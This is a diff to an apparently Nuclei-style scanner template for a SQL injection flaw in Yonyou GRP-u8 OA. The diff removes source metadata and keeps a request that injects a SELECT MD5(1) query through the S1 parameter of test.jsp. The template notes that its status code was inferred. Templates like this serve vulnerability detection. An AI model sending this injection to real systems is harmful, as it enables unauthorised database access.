@@ -3,14 +3,8 @@ info:
   name: 用友 OA GRP-u8 test.jsp SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ydxtlv3s1zn6zg24
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ydxtlv3s1zn6zg24
-    fofa: 暂无
 http:
 - raw:
   - 'GET /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1)) HTTP/1.1
